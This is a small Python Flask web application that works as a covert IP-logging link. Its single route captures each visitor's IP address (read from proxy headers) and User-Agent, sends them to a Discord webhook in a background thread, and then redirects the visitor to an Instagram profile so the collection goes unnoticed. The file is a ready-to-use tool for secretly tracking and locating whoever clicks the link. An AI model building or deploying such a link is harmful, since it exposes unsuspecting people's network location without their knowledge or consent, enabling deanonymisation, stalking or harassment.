import os
import threading
from datetime import datetime, timezone

import requests
from flask import Flask, request, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))

app = Flask(__name__)

# app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)


# environment variables
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
ADMIN_USER = os.getenv("ADMIN_USER")
ADMIN_PASS = os.getenv("ADMIN_PASS")


# ---------- Discord ----------
def _send_to_discord(payload):
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except requests.RequestException:
        pass  

def notify_discord(ip, user_agent, path):
    if not DISCORD_WEBHOOK_URL:
        return
    payload = {
        "embeds": [{
            "title": "New visit",
            "color": 5814783,
            "fields": [
                {"name": "IP", "value": ip or "unknown", "inline": True},
                {"name": "Path", "value": path, "inline": True},
                {"name": "User-Agent", "value": (user_agent or "unknown")[:1000]},
            ],
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }]
    }
    threading.Thread(target=_send_to_discord, args=(payload,), daemon=True).start()


# Main functins
def get_client_ip():
    for header in ("CF-Connecting-IP", "True-Client-IP"):
        value = request.headers.get(header)
        if value:
            return value.strip()
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr


# routers
@app.route("/")
def index():
    ip = get_client_ip()
    ua = request.headers.get("User-Agent", "")[:300]
    notify_discord(ip, ua, request.path)
    return redirect("https://www.instagram.com/kobaladz_?stkn=MXBodW96dTFzNmhkdQ%3D%3D")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)